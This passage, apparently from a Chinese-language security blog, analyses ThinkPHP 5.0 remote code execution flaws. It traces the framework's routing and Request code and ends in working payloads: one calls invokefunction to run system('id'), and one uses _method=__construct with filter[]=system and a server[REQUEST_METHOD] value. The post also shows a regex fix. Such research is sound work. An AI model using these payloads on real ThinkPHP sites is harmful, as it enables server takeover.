<h3 id="Loader-parseName"><a href="#Loader-parseName" class="headerlink" title="Loader::parseName()"></a>Loader::parseName()</h3><p>这里面只关注到了 <code>_</code> 与大小写字母的转换，所以说 <code>\</code> 会被无视</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span>) &#123;  <span class="comment">//下划线转驼峰</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, function (<span class="variable">$match</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$match</span>[<span class="number">1</span>]);  </span><br><span class="line">        &#125;, <span class="variable">$name</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$name</span>) : <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$name</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">	  <span class="comment">//驼峰转下划线</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的利用链：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">用户请求</span><br><span class="line">    ↓</span><br><span class="line">index.php (入口)</span><br><span class="line">    ↓</span><br><span class="line">App::run() 调用 routeCheck()</span><br><span class="line">    ↓</span><br><span class="line">Route::parseUrl() ← 在这里解析出 think\app</span><br><span class="line">    ↓</span><br><span class="line">返回 $dispatch = [&#x27;type&#x27;=&gt;&#x27;module&#x27;, &#x27;module&#x27;=&gt;[&#x27;index&#x27;, &#x27;think\app&#x27;, &#x27;invokefunction&#x27;]]</span><br><span class="line">    ↓</span><br><span class="line">App::exec() 根据 $dispatch 的 type 调用相应方法</span><br><span class="line">    ↓</span><br><span class="line">module() → controller() → 实例化 think\app → 调用 invokefunction 方法</span><br><span class="line">    ↓</span><br><span class="line">think\app::invokefunction() 调用 App::invokeFunction()</span><br><span class="line">    ↓</span><br><span class="line">App::invokeFunction() 执行任意函数 ← RCE!</span><br></pre></td></tr></table></figure>


<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>到这里这个链子似乎就非常的清楚了<br>在thinkphp&#x2F;convention.php 中规定了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;var_pathinfo&#x27;</span>           =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br></pre></td></tr></table></figure>
<p>所以传入的参数为 s</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span></span></span><br></pre></td></tr></table></figure>
<p>php 的原生函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>( <span class="string">&#x27;函数名&#x27;</span>, [ 参数<span class="number">1</span>, 参数<span class="number">2</span>, ... ] );</span><br></pre></td></tr></table></figure>



<p><img src="/images/Pasted%20image%2020260122135449.png"><br><img src="/images/Pasted%20image%2020260122135513.png"><br>主要可以看到传入的参数是 invokefunction<br><img src="/images/Pasted%20image%2020260122135555.png"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>这个漏洞的修复方法也很简单，在 module()中添加正则匹配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z](\w|\.)*$/&#x27;</span>, <span class="variable">$controller</span>)) &#123;  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$controller</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="输入过滤和处理"><a href="#输入过滤和处理" class="headerlink" title="输入过滤和处理"></a>输入过滤和处理</h1><p>接下来看到 Request.php </p>
<h2 id="Request-php-输入处理"><a href="#Request-php-输入处理" class="headerlink" title="Request.php 输入处理"></a>Request.php 输入处理</h2><h3 id="Request-method"><a href="#Request-method" class="headerlink" title="Request::method"></a>Request::method</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$method</span> = <span class="literal">false</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;  </span><br><span class="line">        <span class="comment">// 获取原始请求类型  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>; </span><br><span class="line">        <span class="comment">//当前 HTTP 请求方式，如果取不到，就默认返回 GET</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="variable language_">$this</span>-&gt;method) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)])) &#123;  </span><br><span class="line">	        <span class="comment">//检查 POST 数据中是否有 $_POST[&#x27;_method&#x27;] 这个字段</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)]); </span><br><span class="line">            <span class="comment">//如果表单提交了_method=PUT，$this-&gt;method = &#x27;PUT&#x27; </span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;method&#125;(<span class="variable">$_POST</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>])) &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>]);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;method;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为 HTML规范只允许表单使用 <code>GET</code> 或 <code>POST</code> ，所以需要 method 函数来模拟其他的 HTTP 方法<br>但是 <code>$_POST[&#39;_method&#39;]</code> 的值似乎并没有去做限制。如果我传入的是私有或受保护方法，那么根据PHP的规则，如果在类内部调用，私有和受保护方法也是可以被调用的</p>
<h3 id="Request-server"><a href="#Request-server" class="headerlink" title="Request::server()"></a>Request::server()</h3><p>在method 中调用了 server 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;server)) &#123;  <span class="comment">//检查 server</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;server = <span class="variable">$_SERVER</span>;  <span class="comment">//设置全局变量$_SERVER</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;server = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;server, <span class="variable">$name</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;server, <span class="literal">false</span> === <span class="variable">$name</span> ? <span class="literal">false</span> : <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>), <span class="variable">$default</span>, <span class="variable">$filter</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Request-consrtuct"><a href="#Request-consrtuct" class="headerlink" title="Request::__consrtuct()"></a>Request::__consrtuct()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$options</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)) &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;filter)) &#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;default_filter&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 保存 php://input    $this-&gt;input = file_get_contents(&#x27;php://input&#x27;);  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="built_in">self</span>::<span class="variable">$hook</span>)) &#123;  </span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="built_in">self</span>::<span class="variable">$hook</span>[<span class="variable">$method</span>], <span class="variable">$args</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码重点注意，这是属性注入，但是可以直接导致变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)) &#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>


<h3 id="Request-filterValue"><a href="#Request-filterValue" class="headerlink" title="Request::filterValue()"></a>Request::filterValue()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;  </span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤  </span></span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>在这个方法中直接使用了call_user_func()函数，如果能控制 <code>$filter</code> 和 <code>$value</code> 那么可以直接导致 rce<br>接下来要去找谁会调用 <code>filterValue</code></p>
<h3 id="Request-input"><a href="#Request-input" class="headerlink" title="Request::input()"></a>Request::input()</h3><p>这个方法中调用了 filterValue()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);  </span><br><span class="line">  </span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;  </span><br><span class="line">	    <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);  </span><br><span class="line">	    <span class="title function_ invoke__">reset</span>(<span class="variable">$data</span>);  </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$data</code> 是请求参数<br><code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code> 在这里等价于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以说传入了的数据会被自动解析出来<br>现在要去找谁调用了 input()</p>
<h3 id="Request-param"><a href="#Request-param" class="headerlink" title="Request::param()"></a>Request::param()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;mergeParam)) &#123;  </span><br><span class="line">        <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);  </span><br><span class="line">        <span class="comment">// 自动获取请求变量  </span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:  </span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">default</span>:  </span><br><span class="line">                <span class="variable">$vars</span> = [];  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并  </span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param      = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;  </span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组  </span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();  </span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码统一获取所有 HTTP 请求里的参数，读取和合并参数后统一从 input()方法取值并且过滤<br>在获取参数之前，还要进行一个操作就是参数绑定，所以接下来看到 bindParma()</p>
<h3 id="App-bindParams"><a href="#App-bindParams" class="headerlink" title="App::bindParams()"></a>App::bindParams()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bindParams</span>(<span class="params"><span class="variable">$reflect</span>, <span class="variable">$vars</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="comment">// 自动获取请求变量  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$vars</span>)) &#123;  </span><br><span class="line">        <span class="variable">$vars</span> = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_param_type&#x27;</span>) ?  </span><br><span class="line">        <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">route</span>() :  </span><br><span class="line">        <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法中调用了param()<br>继续查找谁调用了 bindParams–&gt;invokeMethod</p>
<h3 id="App-invokeMethod"><a href="#App-invokeMethod" class="headerlink" title="App::invokeMethod"></a>App::invokeMethod</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...反射逻辑...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ⚠️ 这里调用了 bindParams 来准备参数</span></span><br><span class="line">    <span class="variable">$args</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">bindParams</span>(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...记录日志...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行具体的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>) ? <span class="variable">$class</span> : <span class="literal">null</span>, <span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来又是module()调用了invokeMethod()<br>exec()调用了 module()<br>run()调用了 exec()</p>
<h3 id="App-module"><a href="#App-module" class="headerlink" title="App::module()"></a>App::module()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作  </span></span><br><span class="line">    <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">module</span>(  </span><br><span class="line">        <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],  </span><br><span class="line">        <span class="variable">$config</span>,  </span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span>  </span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>为了确保能走到invokeMethod那边，所以 <code>$dispatch</code> 必须为存在的路由</p>
<h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>先尝试发送，并且在此处打下断点</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system</span><br></pre></td></tr></table></figure>
<p>结果就是代码，还没有走到这里就结束了<br><img src="/images/Pasted%20image%2020260126165300.png"></p>
<p>在Route.php 的 <code>$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];</code> 打下断点，可以发现当前的吗 <code>method=__construct</code> ，所以才导致的后续代码无法去执行<br><img src="/images/Pasted%20image%2020260127084936.png"><br>所以要添加 method 参数<br>当在 payload 中添加 <code>method=get</code> 之后，此时依然是无法命令执行<br><img src="/images/Pasted%20image%2020260127085506.png"><br> 来看到filterValue 的参数，此时的 Value 的值为POST<br><img src="/images/a6349c3614a0bf20b2bfd9b9ddc40393.png"><br>注意这里的 key 为键名，而这个 key 来自于 $REQUEST_METHOD<br>在 method 方法中调用了 <code>return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;</code><br>在此处打上断点进行调试<br><img src="/images/2d3d889f1ad4e3bafbf19dd3f3e8326b.png"><br>可看到REQUEST_METHOD存在于 server 环境变量中，所以在 payload 中添加 <code>server[REQUEST_METHOD]=pwd</code><br>再进行调试就能看到 value 值为 pwd 了<br><img src="/images/Pasted%20image%2020260127102713.png"></p>
